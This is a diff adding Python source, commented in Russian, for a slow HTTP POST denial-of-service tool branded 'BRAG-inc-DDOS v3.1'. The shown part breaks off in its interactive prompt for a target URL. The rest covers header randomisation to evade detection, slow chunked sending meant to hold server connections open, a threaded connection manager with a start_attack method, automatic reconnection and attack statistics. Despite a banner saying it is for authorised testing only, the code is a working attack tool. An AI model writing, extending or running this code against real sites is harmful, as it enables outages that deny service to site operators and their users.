+            f"X-Real-IP: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
+            f"X-Client-IP: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
+            "X-Requested-With: XMLHttpRequest",
+            "X-CSRF-Token: " + hashlib.md5(str(random.random()).encode()).hexdigest(),
+            "X-Request-ID: " + generate_session_id(),
+            "DNT: 1",
+            "Sec-Fetch-Dest: document",
+            "Sec-Fetch-Mode: navigate",
+            "Sec-Fetch-Site: same-origin",
+            "Sec-Fetch-User: ?1",
+            "TE: trailers"
+        ]
+        
+        # Добавляем случайные дополнительные заголовки
+        num_extra = random.randint(2, 5)
+        selected_extra = random.sample(extra_headers, num_extra)
+        
+        # Вставляем дополнительные заголовки в случайные позиции
+        for header in selected_extra:
+            insert_pos = random.randint(3, len(headers) - 2)
+            headers.insert(insert_pos, header)
+        
+        # Добавляем фиктивные заголовки для увеличения размера
+        if random.random() > 0.7:
+            fake_headers = [
+                f"X-Custom-Header-{i}: {hashlib.md5(str(i).encode()).hexdigest()[:8]}"
+                for i in range(random.randint(1, 3))
+            ]
+            headers.extend(fake_headers)
+        
+        headers.append("\r\n")
+        return "\r\n".join(headers)
+    
+    def send_slowly(self) -> bool:
+        """Отправляет данные медленно с улучшенной логикой и мониторингом"""
+        try:
+            # Генерация и отправка заголовков
+            headers = self.generate_custom_headers()
+            initial_data = f"{headers}{self.post_param}="
+            
+            # Отправка начальных данных
+            self.socket.send(initial_data.encode())
+            self.bytes_sent += len(initial_data)
+            self.packets_sent += 1
+            self.last_activity = time.time()
+            
+            logger.debug(f"[CONN-{self.connection_id}] Заголовки отправлены ({len(initial_data)} байт)")
+            
+            # Переменные для адаптивной логики
+            consecutive_fast_chunks = 0
+            adaptive_delay_min = self.delay_min
+            adaptive_delay_max = self.delay_max
+            
+            # Медленная отправка тела запроса
+            while self.running:
+                try:
+                    # Адаптивный размер чанка
+                    if consecutive_fast_chunks > 10:
+                        # Уменьшаем размер чанка если много быстрых отправок
+                        chunk_size = random.randint(
+                            max(1, self.chunk_size_min // 2),
+                            max(2, self.chunk_size_max // 2)
+                        )
+                        consecutive_fast_chunks = 0
+                    else:
+                        chunk_size = random.randint(self.chunk_size_min, self.chunk_size_max)
+                    
+                    # Выбор данных из пула или генерация новых
+                    if random.random() > 0.3:
+                        chunk = random.choice(self.data_pool)[:chunk_size]
+                        # Дополняем если нужно
+                        if len(chunk) < chunk_size:
+                            chunk += 'A' * (chunk_size - len(chunk))
+                    else:
+                        # Генерация новых случайных данных
+                        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
+                        chunk = ''.join(random.choice(charset) for _ in range(chunk_size))
+                    
+                    # Адаптивная задержка
+                    current_delay_min = adaptive_delay_min
+                    current_delay_max = adaptive_delay_max
+                    
+                    # Увеличиваем задержку если отправлено много данных
+                    if self.packets_sent > 100:
+                        current_delay_min *= 1.5
+                        current_delay_max *= 1.5
+                    elif self.packets_sent > 500:
+                        current_delay_min *= 2.0
+                        current_delay_max *= 2.0
+                    
+                    delay = random.uniform(current_delay_min, current_delay_max)
+                    
+                    # Отправка чанка
+                    start_send = time.time()
+                    self.socket.send(chunk.encode())
+                    send_time = time.time() - start_send
+                    
+                    # Обновление статистики
+                    self.bytes_sent += chunk_size
+                    self.packets_sent += 1
+                    self.last_activity = time.time()
+                    
+                    # Адаптация на основе времени отправки
+                    if send_time < 0.01:  # Очень быстрая отправка
+                        consecutive_fast_chunks += 1
+                    else:
+                        consecutive_fast_chunks = max(0, consecutive_fast_chunks - 1)
+                    
+                    # Периодическая проверка соединения
+                    if self.packets_sent % 15 == 0:
+                        if not self.check_connection():
+                            logger.warning(f"[CONN-{self.connection_id}] Соединение разорвано")
+                            return False
+                    
+                    # Детальное логирование прогресса
+                    if self.packets_sent % 75 == 0:
+                        elapsed = time.time() - self.start_time
+                        speed = self.bytes_sent / elapsed if elapsed > 0 else 0
+                        avg_chunk_size = self.bytes_sent / self.packets_sent if self.packets_sent > 0 else 0
+                        
+                        logger.debug(
+                            f"[CONN-{self.connection_id}] Прогресс: {format_bytes(self.bytes_sent)} отправлено, "
+                            f"{self.packets_sent} пакетов, {speed/1024:.2f} KB/s, "
+                            f"ср. размер пакета: {avg_chunk_size:.1f} байт"
+                        )
+                    
+                    # Адаптивная задержка с учетом времени отправки
+                    adjusted_delay = max(0.01, delay - send_time)
+                    time.sleep(adjusted_delay)
+                    
+                except (socket.error, ConnectionResetError, BrokenPipeError, OSError) as e:
+                    logger.info(f"[CONN-{self.connection_id}] Ошибка соединения: {e}")
+                    return False
+                except Exception as e:
+                    logger.error(f"[CONN-{self.connection_id}] Неожиданная ошибка: {e}")
+                    return False
+            
+            return True
+            
+        except Exception as e:
+            logger.error(f"[CONN-{self.connection_id}] Критическая ошибка в send_slowly: {e}")
+            return False
+    
+    def check_connection(self) -> bool:
+        """Проверяет, живо ли соединение с улучшенной логикой"""
+        try:
+            # Проверяем с помощью MSG_PEEK
+            self.socket.settimeout(0.3)
+            
+            # Проверяем, есть ли данные для чтения
+            ready_to_read, _, _ = select.select([self.socket], [], [], 0.1)
+            
+            if ready_to_read:
+                # Пытаемся прочитать байт без удаления из буфера
+                data = self.socket.recv(1, socket.MSG_PEEK)
+                if data == b'':
+                    logger.debug(f"[CONN-{self.connection_id}] Соединение закрыто удаленной стороной")
+                    return False
+                
+                # Если получили данные, соединение активно
+                return True
+            else:
+                # Нет данных для чтения, но соединение может быть активным
+                # Отправляем пробный байт для проверки
+                self.socket.settimeout(0.2)
+                try:
+                    self.socket.send(b'')
+                    return True
+                except socket.timeout:
+                    # Таймаут при отправке - соединение все еще может быть активным
+                    return True
+                except (socket.error, OSError):
+                    # Ошибка при отправке - соединение разорвано
+                    return False
+                    
+        except socket.timeout:
+            # Таймаут - соединение все еще активно
+            return True
+        except Exception:
+            # Любая другая ошибка - считаем соединение разорванным
+            return False
+        finally:
+            # Восстанавливаем таймаут
+            self.socket.settimeout(30)
+    
+    def run(self) -> None:
+        """Запускает медленное соединение с улучшенной обработкой ошибок"""
+        self.start_time = time.time()
+        self.running = True
+        
+        logger.info(f"[CONN-{self.connection_id}] Запуск соединения к {self.host}:{self.port}")
+        
+        try:
+            # Попытки создания сокета
+            while self.connection_attempts < self.max_connection_attempts and self.running:
+                self.socket = self.create_secure_socket()
+                
+                if self.socket:
+                    logger.info(f"[CONN-{self.connection_id}] Сокет создан (попытка {self.connection_attempts})")
+                    break
+                else:
+                    logger.warning(f"[CONN-{self.connection_id}] Не удалось создать сокет, повтор через 2-5 секунд")
+                    time.sleep(random.uniform(2, 5))
+            
+            if not self.socket:
+                logger.error(f"[CONN-{self.connection_id}] Не удалось создать сокет после {self.connection_attempts} попыток")
+                return
+            
+            # Запуск медленной отправки
+            success = self.send_slowly()
+            
+            # Попытка переподключения при неудаче
+            if not success and self.running and self.connection_attempts < self.max_connection_attempts:
+                logger.info(f"[CONN-{self.connection_id}] Попытка переподключения...")
+                time.sleep(random.uniform(3, 8))
+                
+                # Закрываем текущий сокет
+                self.close()
+                
+                # Рекурсивный перезапуск
+                self.run()
+                
+        except KeyboardInterrupt:
+            logger.info(f"[CONN-{self.connection_id}] Прервано пользователем")
+        except Exception as e:
+            logger.error(f"[CONN-{self.connection_id}] Критическая ошибка: {e}")
+        finally:
+            self.close()
+            elapsed = time.time() - self.start_time if self.start_time else 0
+            
+            # Подробная статистика завершения
+            logger.info(
+                f"[CONN-{self.connection_id}] Завершено. "
+                f"Отправлено: {format_bytes(self.bytes_sent)}, "
+                f"Пакетов: {self.packets_sent}, "
+                f"Время: {elapsed:.1f}с, "
+                f"Скорость: {self.bytes_sent/elapsed/1024:.2f} KB/с"
+            )
+    
+    def close(self) -> None:
+        """Корректно закрывает соединение с улучшенной обработкой"""
+        self.running = False
+        
+        try:
+            if self.socket:
+                # Пытаемся корректно завершить соединение
+                try:
+                    self.socket.shutdown(socket.SHUT_RDWR)
+                except:
+                    pass
+                
+                # Закрываем сокет
+                self.socket.close()
+                logger.debug(f"[CONN-{self.connection_id}] Сокет закрыт")
+        except Exception as e:
+            logger.debug(f"[CONN-{self.connection_id}] Ошибка при закрытии сокета: {e}")
+        finally:
+            self.socket = None
+
+# ============================================================================
+# КЛАСС ИНТЕЛЛЕКТУАЛЬНОГО МЕНЕДЖЕРА СОЕДИНЕНИЙ
+# ============================================================================
+
+class IntelligentConnectionManager:
+    """Интеллектуальный менеджер соединений с расширенной статистикой и управлением"""
+    
+    def __init__(self):
+        self.connections: List[EnhancedSlowPostConnection] = []
+        self.running = False
+        self.stats_lock = threading.Lock()
+        self.config_lock = threading.Lock()
+        self.session_id = generate_session_id()
+        
+        # Расширенная статистика
+        self.stats = {
+            'total_connections': 0,
+            'active_connections': 0,
+            'total_bytes_sent': 0,
+            'total_packets_sent': 0,
+            'start_time': None,
+            'failed_connections': 0,
+            'reconnections': 0,
+            'connection_errors': 0,
+            'bytes_per_second': 0,
+            'peak_bytes_per_second': 0,
+            'avg_packet_size': 0,
+            'connection_duration': 0,
+            'successful_connections': 0
+        }
+        
+        # Конфигурация по умолчанию с расширенными параметрами
+        self.config = {
+            'chunk_min': 1,
+            'chunk_max': 10,
+            'delay_min': 0.5,
+            'delay_max': 5.0,
+            'max_reconnect_attempts': 5,
+            'max_connections_per_second': 10,
+            'health_check_interval': 5,
+            'reconnect_threshold': 0.7,
+            'adaptive_delay': True,
+            'randomize_content_length': True,
+            'content_length_min': 5000000,
+            'content_length_max': 20000000,
+            'connection_timeout': 30,
+            'enable_compression': False,
+            'use_proxy': False,
+            'proxy_host': None,
+            'proxy_port': None,
+            'proxy_type': 'http'
+        }
+        
+        # История для графиков/аналитики
+        self.history = {
+            'timestamps': [],
+            'bytes_sent': [],
+            'active_connections': [],
+            'connection_errors': []
+        }
+        
+        logger.info(f"[MANAGER-{self.session_id}] Менеджер соединений инициализирован")
+    
+    def update_stats(self, key: str, value: Any, operation: str = 'add') -> None:
+        """Безопасное обновление статистики с поддержкой различных операций"""
+        with self.stats_lock:
+            if key in self.stats:
+                if operation == 'add' and isinstance(self.stats[key], (int, float)):
+                    self.stats[key] += value
+                elif operation == 'set':
+                    self.stats[key] = value
+                elif operation == 'max':
+                    if isinstance(self.stats[key], (int, float)) and value > self.stats[key]:
+                        self.stats[key] = value
+    
+    def update_config(self, new_config: Dict[str, Any]) -> None:
+        """Обновляет конфигурацию менеджера"""
+        with self.config_lock:
+            self.config.update(new_config)
+            logger.info(f"[MANAGER-{self.session_id}] Конфигурация обновлена: {new_config}")
+    
+    def start_attack(self, target_url: str, form_action: str, post_param: str, 
+                     num_connections: int, attack_config: Optional[Dict[str, Any]] = None) -> None:
+        """Запускает улучшенную атаку с расширенным управлением"""
+        self.running = True
+        self.stats['start_time'] = time.time()
+        self.stats['total_connections'] = num_connections
+        
+        if attack_config:
+            self.update_config(attack_config)
+        
+        # Отображение детальной информации о запуске
+        logger.info(f"🚀 Запуск расширенной атаки с {num_connections} соединениями")
+        logger.info(f"🎯 Цель: {form_action}")
+        logger.info(f"📝 Параметр: {post_param}")
+        logger.info(f"⚙️  Конфигурация: {self.config}")
+        logger.info(f"📊 Ожидаемый трафик: ~{num_connections * self.config['content_length_max'] / 1024 / 1024:.1f} MB")
+        
+        # Запуск мониторинга в отдельном потоке
+        monitor_thread = threading.Thread(target=self.monitor_and_display, daemon=True, name="MonitorThread")
+        monitor_thread.start()
+        
+        # Запуск сборщика статистики
+        stats_thread = threading.Thread(target=self.collect_statistics, daemon=True, name="StatsThread")
+        stats_thread.start()
+        
+        # Запуск соединений с регулировкой скорости
+        connections_started = 0
+        connections_per_second = self.config['max_connections_per_second']
+        
+        for i in range(num_connections):
+            if not self.running:
+                logger.warning(f"[MANAGER-{self.session_id}] Атака остановлена пользователем")
+                break
+            
+            conn_id = i + 1
+            
+            # Создание соединения с индивидуальной конфигурацией
+            conn_config = self.config.copy()
+            
+            # Случайное варьирование параметров для каждого соединения
+            if self.config.get('adaptive_delay', True):
+                conn_config['delay_min'] = max(0.1, random.uniform(
+                    self.config['delay_min'] * 0.8,
+                    self.config['delay_min'] * 1.2
+                ))
+                conn_config['delay_max'] = max(conn_config['delay_min'] + 0.1, random.uniform(
+                    self.config['delay_max'] * 0.8,
+                    self.config['delay_max'] * 1.2
+                ))
+            
+            if self.config.get('randomize_content_length', True):
+                conn_config['content_length'] = random.randint(
+                    self.config['content_length_min'],
+                    self.config['content_length_max']
+                )
+            
+            conn = EnhancedSlowPostConnection(
+                target_url=target_url,
+                form_action=form_action,
+                post_param=post_param,
+                connection_id=conn_id,
+                config=conn_config
+            )
+            
+            self.connections.append(conn)
+            
+            # Запуск соединения в отдельном потоке
+            thread = threading.Thread(
+                target=conn.run,
+                daemon=True,
+                name=f"Connection-{conn_id}"
+            )
+            thread.start()
+            
+            connections_started += 1
+            
+            # Регулировка скорости создания соединений
+            if connections_per_second > 0:
+                delay = 1.0 / connections_per_second
+                jitter = delay * 0.3  # 30% джиттер
+                actual_delay = max(0.01, random.uniform(delay - jitter, delay + jitter))
+                time.sleep(actual_delay)
+            else:
+                # Без ограничения скорости
+                time.sleep(random.uniform(0.05, 0.15))
+            
+            # Периодический отчет о прогрессе
+            if connections_started % 25 == 0 or connections_started == num_connections:
+                logger.info(f"[MANAGER-{self.session_id}] Запущено {connections_started}/{num_connections} соединений")
+        
+        logger.info(f"[MANAGER-{self.session_id}] Все соединения запущены")
+        
+        # Основной цикл ожидания
+        try:
+            while self.running:
+                # Проверка активности соединений
+                active_count = sum(1 for conn in self.connections if conn.running)
+                
+                # Автоматическая регулировка на основе активности
+                if active_count < self.stats['total_connections'] * self.config['reconnect_threshold']:
+                    self.reconnect_dead_connections()
+                
+                # Проверка здоровья соединений
+                self.health_check()
+                
+                time.sleep(1)
+                
+        except KeyboardInterrupt:
+            logger.info(f"[MANAGER-{self.session_id}] Атака прервана пользователем")
+            self.stop()
+        except Exception as e:
+            logger.error(f"[MANAGER-{self.session_id}] Ошибка в основном цикле: {e}")
+            self.stop()
+    
+    def monitor_and_display(self) -> None:
+        """Мониторинг и отображение статистики с улучшенным UI"""
+        try:
+            last_display = 0
+            display_interval = 2  # секунды
+            
+            # ANSI коды для цветного вывода
+            COLORS = {
+                'green': '\033[92m',
+                'yellow': '\033[93m',
+                'blue': '\033[94m',
+                'magenta': '\033[95m',
+                'cyan': '\033[96m',
+                'red': '\033[91m',
+                'reset': '\033[0m',
+                'bold': '\033[1m'
+            }
+            
+            while self.running:
+                current_time = time.time()
+                
+                # Сбор статистики
+                active_count = sum(1 for conn in self.connections if conn.running)
+                total_bytes = sum(conn.bytes_sent for conn in self.connections)
+                total_packets = sum(conn.packets_sent for conn in self.connections)
+                
+                # Обновление статистики
+                self.update_stats('active_connections', active_count, 'set')
+                self.update_stats('total_bytes_sent', total_bytes, 'set')
+                self.update_stats('total_packets_sent', total_packets, 'set')
+                
+                # Расчет скорости
+                elapsed = current_time - self.stats['start_time'] if self.stats['start_time'] else 0
+                if elapsed > 0:
+                    bytes_per_second = total_bytes / elapsed
+                    self.update_stats('bytes_per_second', bytes_per_second, 'set')
+                    self.update_stats('peak_bytes_per_second', bytes_per_second, 'max')
+                    
+                    # Расчет среднего размера пакета
+                    if total_packets > 0:
+                        avg_packet_size = total_bytes / total_packets
+                        self.update_stats('avg_packet_size', avg_packet_size, 'set')
+                
+                # Отображение каждые display_interval секунд
+                if current_time - last_display >= display_interval:
+                    if sys.stdout.isatty():
+                        # Цветной вывод с форматированием
+                        status_line = (
+                            f"{COLORS['bold']}{COLORS['green']}АКТИВНО: {active_count:3d}/{self.stats['total_connections']:3d}{COLORS['reset']} | "
+                            f"{COLORS['yellow']}ТРАФИК: {format_bytes(total_bytes):>12}{COLORS['reset']} | "
+                            f"{COLORS['blue']}СКОРОСТЬ: {bytes_per_second/1024:7.2f} KB/s{COLORS['reset']} | "
+                            f"{COLORS['magenta']}ВРЕМЯ: {elapsed:6.0f}с{COLORS['reset']} | "
+                            f"{COLORS['cyan']}ПАКЕТОВ: {total_packets:6d}{COLORS['reset']} | "
+                            f"{COLORS['red']}ОШИБОК: {self.stats['connection_errors']:3d}{COLORS['reset']}"
+                        )
+                    else:
+                        # Простой вывод без цветов
+                        status_line = (
+                            f"АКТИВНО: {active_count:3d}/{self.stats['total_connections']:3d} | "
+                            f"ТРАФИК: {format_bytes(total_bytes):>12} | "
+                            f"СКОРОСТЬ: {bytes_per_second/1024:7.2f} KB/s | "
+                            f"ВРЕМЯ: {elapsed:6.0f}с | "
+                            f"ПАКЕТОВ: {total_packets:6d} | "
+                            f"ОШИБОК: {self.stats['connection_errors']:3d}"
+                        )
+                    
+                    print(f"\r{status_line}", end="", flush=True)
+                    last_display = current_time
+                
+                time.sleep(0.5)
+                
+        except KeyboardInterrupt:
+            pass
+        except Exception as e:
+            logger.error(f"[MANAGER-{self.session_id}] Ошибка мониторинга: {e}")
+    
+    def collect_statistics(self) -> None:
+        """Сбор статистики для истории и аналитики"""
+        try:
+            while self.running:
+                current_time = time.time()
+                
+                # Сбор текущих данных
+                active_count = sum(1 for conn in self.connections if conn.running)
+                total_bytes = sum(conn.bytes_sent for conn in self.connections)
+                
+                # Добавление в историю
+                self.history['timestamps'].append(current_time)
+                self.history['bytes_sent'].append(total_bytes)
+                self.history['active_connections'].append(active_count)
+                self.history['connection_errors'].append(self.stats['connection_errors'])
+                
+                # Ограничение размера истории (последние 1000 записей)
+                max_history = 1000
+                for key in self.history:
+                    if len(self.history[key]) > max_history:
+                        self.history[key] = self.history[key][-max_history:]
+                
+                time.sleep(5)  # Сбор статистики каждые 5 секунд
+                
+        except Exception as e:
+            logger.error(f"[MANAGER-{self.session_id}] Ошибка сбора статистики: {e}")
+    
+    def health_check(self) -> None:
+        """Проверка здоровья соединений с расширенной диагностикой"""
+        try:
+            for i, conn in enumerate(self.connections):
+                if not conn.running:
+                    # Проверка времени бездействия для мертвых соединений
+                    if hasattr(conn, 'last_activity') and conn.last_activity:
+                        inactive_time = time.time() - conn.last_activity
+                        if inactive_time > 30:  # Соединение мертво более 30 секунд
+                            logger.debug(f"[MANAGER-{self.session_id}] Соединение {conn.connection_id} неактивно {inactive_time:.1f}с")
+                    
+                    # Увеличиваем счетчик ошибок
+                    self.update_stats('connection_errors', 1)
+                    
+        except Exception as e:
+            logger.error(f"[MANAGER-{self.session_id}] Ошибка проверки здоровья: {e}")
+    
+    def reconnect_dead_connections(self) -> None:
+        """Перезапускает умершие соединения с улучшенной логикой"""
+        try:
+            reconnected = 0
+            max_reconnections = min(10, len(self.connections) // 4)  # Не более 25% соединений за раз
+            
+            for i, conn in enumerate(self.connections):
+                if not conn.running and reconnected < max_reconnections:
+                    # Проверяем, стоит ли переподключать это соединение
+                    should_reconnect = (
+                        conn.packets_sent < 100 or  # Умерло слишком рано
+                        time.time() - conn.start_time < 30  # Проработало менее 30 секунд
+                    )
+                    
+                    if should_reconnect:
+                        try:
+                            logger.info(f"[MANAGER-{self.session_id}] Переподключение соединения {conn.connection_id}")
+                            
+                            # Создаем новое соединение с теми же параметрами
+                            new_conn = EnhancedSlowPostConnection(
+                                target_url=conn.target_url,
+                                form_action=conn.form_action,
+                                post_param=conn.post_param,
+                                connection_id=conn.connection_id,
+                                config=conn.config
+                            )
+                            
+                            # Запускаем в новом потоке
+                            thread = threading.Thread(
+                                target=new_conn.run,
+                                daemon=True,
+                                name=f"Reconnect-{conn.connection_id}"
+                            )
+                            thread.start()
+                            
+                            self.connections[i] = new_conn
+                            self.stats['reconnections'] += 1
+                            reconnected += 1
+                            
+                            # Задержка между переподключениями
+                            time.sleep(random.uniform(0.5, 1.5))
+                            
+                        except Exception as e:
+                            logger.error(f"[MANAGER-{self.session_id}] Не удалось переподключить {conn.connection_id}: {e}")
+                            self.stats['failed_connections'] += 1
+            
+            if reconnected > 0:
+                logger.info(f"[MANAGER-{self.session_id}] Переподключено {reconnected} соединений")
+                
+        except Exception as e:
+            logger.error(f"[MANAGER-{self.session_id}] Ошибка переподключения: {e}")
+    
+    def stop(self) -> None:
+        """Корректно останавливает все соединения с расширенной статистикой"""
+        logger.info(f"[MANAGER-{self.session_id}] Остановка всех соединений...")
+        self.running = False
+        
+        # Останавливаем все соединения
+        for conn in self.connections:
+            conn.running = False
+        
+        # Даем время на корректное закрытие
+        logger.info(f"[MANAGER-{self.session_id}] Ожидание завершения соединений...")
+        time.sleep(5)
+        
+        # Форсированное закрытие
+        for conn in self.connections:
+            conn.close()
+        
+        # Вывод расширенной статистики
+        self.display_final_statistics()
+    
+    def display_final_statistics(self) -> None:
+        """Отображает расширенную финальную статистику"""
+        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
+        total_bytes = sum(conn.bytes_sent for conn in self.connections)
+        total_packets = sum(conn.packets_sent for conn in self.connections)
+        
+        print("\n" + "="*80)
+        print("📊 РАСШИРЕННАЯ СТАТИСТИКА АТАКИ")
+        print("="*80)
+        
+        # Основная статистика
+        print(f"\n🎯 Основные показатели:")
+        print(f"   Общее время: {elapsed:.1f} секунд")
+        print(f"   Всего отправлено: {format_bytes(total_bytes)}")
+        print(f"   Всего пакетов: {total_packets:,}")
+        print(f"   Максимальная скорость: {self.stats['peak_bytes_per_second']/1024/1024:.2f} MB/с")
+        
+        if elapsed > 0:
+            print(f"   Средняя скорость: {total_bytes/elapsed/1024/1024:.2f} MB/с")
+            print(f"   Пакетов в секунду: {total_packets/elapsed:.1f}")
+        
+        # Статистика соединений
+        print(f"\n🔗 Статистика соединений:")
+        print(f"   Всего соединений: {self.stats['total_connections']}")
+        print(f"   Успешных соединений: {self.stats['successful_connections']}")
+        print(f"   Ошибочных соединений: {self.stats['connection_errors']}")
+        print(f"   Переподключений: {self.stats['reconnections']}")
+        print(f"   Неудачных подключений: {self.stats['failed_connections']}")
+        
+        if total_packets > 0:
+            print(f"   Средний размер пакета: {total_bytes/total_packets:.1f} байт")
+        
+        # Эффективность
+        print(f"\n⚡ Эффективность:")
+        if self.stats['total_connections'] > 0:
+            success_rate = (self.stats['successful_connections'] / self.stats['total_connections']) * 100
+            print(f"   Успешность соединений: {success_rate:.1f}%")
+        
+        if elapsed > 0 and total_bytes > 0:
+            efficiency = (total_bytes / elapsed) / (1024 * 1024)  # MB/s
+            print(f"   Эффективность атаки: {efficiency:.2f} MB/с")
+        
+        # Рекомендации
+        print(f"\n💡 Рекомендации:")
+        if self.stats['connection_errors'] > self.stats['total_connections'] * 0.3:
+            print("   ⚠️  Высокий уровень ошибок соединения. Попробуйте уменьшить количество соединений.")
+        
+        if self.stats['peak_bytes_per_second'] < 1024:  # Менее 1 KB/s
+            print("   ⚠️  Низкая скорость отправки. Попробуйте уменьшить задержки между пакетами.")
+        
+        if self.stats['reconnections'] > self.stats['total_connections'] * 0.5:
+            print("   ⚠️  Много переподключений. Возможно, цель активно закрывает соединения.")
+        
+        print("="*80)
+        print("✅ Атака завершена\n")
+
+# ============================================================================
+# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ РАБОТЫ С КОНФИГУРАЦИЕЙ И ДАННЫМИ
+# ============================================================================
+
+def save_scan_results(forms: List[Dict[str, Any]], filename: str = "scan_results.json") -> None:
+    """Сохраняет результаты сканирования в JSON с улучшенным форматированием"""
+    try:
+        # Добавляем метаданные
+        enhanced_data = {
+            'metadata': {
+                'scan_date': datetime.now().isoformat(),
+                'tool': 'BRAG-inc-DDOS v3.1',
+                'version': VERSION,
+                'total_forms_found': len(forms)
+            },
+            'forms': forms
+        }
+        
+        with open(filename, 'w', encoding='utf-8') as f:
+            json.dump(enhanced_data, f, indent=2, ensure_ascii=False, default=str)
+        
+        logger.info(f"Результаты сканирования сохранены в {filename} ({len(forms)} форм)")
+        
+        # Дополнительно сохраняем краткий отчет
+        summary_file = filename.replace('.json', '_summary.txt')
+        with open(summary_file, 'w', encoding='utf-8') as f:
+            f.write(f"ОТЧЕТ СКАНИРОВАНИЯ - BRAG-inc-DDOS v{VERSION}\n")
+            f.write(f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"Всего найдено форм: {len(forms)}\n")
+            f.write("=" * 60 + "\n\n")
+            
+            for i, form in enumerate(forms, 1):
+                f.write(f"ФОРМА #{i}\n")
+                f.write(f"  URL: {form['action']}\n")
+                f.write(f"  Метод: {form['method']}\n")
+                f.write(f"  Поля: {', '.join(form['inputs'])}\n")
+                f.write(f"  Источник: {form['source_url']}\n")
+                f.write("-" * 40 + "\n")
+        
+        logger.info(f"Краткий отчет сохранен в {summary_file}")
+        
+    except Exception as e:
+        logger.error(f"Не удалось сохранить результаты сканирования: {e}")
+
+def load_config(config_file: str = 'rudeadyet.conf') -> Dict[str, Any]:
+    """Загружает конфигурацию из файла с улучшенной обработкой ошибок"""
+    config = ConfigParser()
+    
+    if not os.path.exists(config_file):
+        logger.warning(f"Файл конфигурации {config_file} не найден, используются значения по умолчанию")
+        return {}
+    
+    try:
+        # Чтение конфигурации с обработкой различных форматов
+        config.read(config_file, encoding='utf-8')
+        
+        # Получение параметров с значениями по умолчанию
+        attack_config = {
+            'url': config.get('parameters', 'URL', fallback=''),
+            'num_connections': config.getint('parameters', 'number_of_connections', fallback=100),
+            'attack_parameter': config.get('parameters', 'attack_parameter', fallback=''),
+            'form_action': config.get('parameters', 'form_action', fallback=''),
+            'chunk_min': config.getint('parameters', 'chunk_min', fallback=1),
+            'chunk_max': config.getint('parameters', 'chunk_max', fallback=10),
+            'delay_min': config.getfloat('parameters', 'delay_min', fallback=0.5),
+            'delay_max': config.getfloat('parameters', 'delay_max', fallback=5.0),
+            'content_length': config.getint('parameters', 'content_length', fallback=random.randint(10000000, 50000000)),
+            'max_reconnect_attempts': config.getint('parameters', 'max_reconnect_attempts', fallback=5),
+            'max_connections_per_second': config.getint('parameters', 'max_connections_per_second', fallback=10)
+        }
+        
+        # Проверка обязательных параметров
+        required_params = ['url', 'attack_parameter']
+        missing_params = [p for p in required_params if not attack_config.get(p)]
+        
+        if missing_params:
+            logger.error(f"В конфигурации отсутствуют обязательные параметры: {missing_params}")
+            return {}
+        
+        logger.info(f"Конфигурация успешно загружена из {config_file}")
+        return attack_config
+        
+    except Exception as e:
+        logger.error(f"Ошибка чтения конфигурации: {e}")
+        return {}
+
+def display_banner() -> None:
+    """Отображает баннер BRAG-inc-DDOS с улучшенным дизайном"""
+    banner = f"""
+╔══════════════════════════════════════════════════════════════════╗
+║                     BRAG-inc-DDOS v{VERSION}                          ║
+║            Enhanced Slow HTTP POST Security Testing Tool         ║
+║                                                                  ║
+║         ██████╗ ██████╗  █████╗  ██████╗      ██╗███╗   ██╗ ██████╗║
+║         ██╔══██╗██╔══██╗██╔══██╗██╔════╝      ██║████╗  ██║██╔════╝║
+║         ██████╔╝██████╔╝███████║██║  ███╗     ██║██╔██╗ ██║██║     ║
+║         ██╔══██╗██╔══██╗██╔══██║██║   ██║     ██║██║╚██╗██║██║     ║
+║         ██████╔╝██║  ██║██║  ██║╚██████╔╝     ██╔╝██║ ╚████║╚██████║
+║         ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═╝ ╚═╝  ╚═══╝ ╚═════╝║
+║                                                                  ║
+║              DDoS RESEARCH & SECURITY ASSESSMENT                 ║
+║                     BRAG-inc Security Team                       ║
+║                           {COPYRIGHT}           ║
+╚══════════════════════════════════════════════════════════════════╝
+
+███████╗███████╗ ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
+██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗
+███████╗█████╗  ██║     ██║   ██║██████╔╝█████╗  ██████╔╝
+╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██╔══╝  ██╔══██╗
+███████║███████╗╚██████╗╚██████╔╝██║  ██║███████╗██║  ██║
+╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+
+╔══════════════════════════════════════════════════════════════════╗
+║                       ВНИМАНИЕ / WARNING                          ║
+║         This tool is for AUTHORIZED SECURITY TESTING ONLY        ║
+║        Использование без разрешения является НЕЗАКОННЫМ          ║
+║         You are solely responsible for your actions              ║
+║               Вы несете полную ответственность за свои действия  ║
+╚══════════════════════════════════════════════════════════════════╝
+
+"""
+    print(banner)
+
+# ============================================================================
+# ИНТЕРАКТИВНЫЙ РЕЖИМ С РАСШИРЕННЫМИ ВОЗМОЖНОСТЯМИ
+# ============================================================================
+
+def interactive_mode() -> None:
+    """Улучшенный интерактивный режим с расширенными возможностями"""
+    print("\n" + "="*70)
+    print("╔════════════════════════════════════════════════════════╗")
+    print("║               BRAG-inc-DDOS v3.1 Interactive           ║")
+    print("║            Slow HTTP POST Security Testing             ║")
+    print("╚════════════════════════════════════════════════════════╝")
+    print("⚠️  FOR AUTHORIZED SECURITY TESTING ONLY")
+    print("="*70)
+    
+    # Ввод URL с валидацией
+    while True:
+        url = input("\n🎯 Введите целевой URL (например, https://example.com): ").strip()
+        if url:
+            if not url.startswith(('http://', 'https://')):
+                url = 'http://' + url
+            
+            # Базовая валидация URL
+            try:
+                parsed = urlparse(url)
+                if not parsed.netloc:
+                    print("❌ Неверный URL. Пожалуйста, введите корректный URL.")
+                    continue
+                break
+            except:
+                print("❌ Неверный URL. Пожалуйста, введите корректный URL.")
+        else:
+            print("❌ URL обязателен для ввода!")
+    
+    # Настройка сканирования
+    print(f"\n🔍 Настройка сканирования {url}")
+    
+    try:
+        max_pages_input = input("Максимальное количество страниц для сканирования (по умолчанию 15): ").strip()
+        max_pages = int(max_pages_input) if max_pages_input else 15
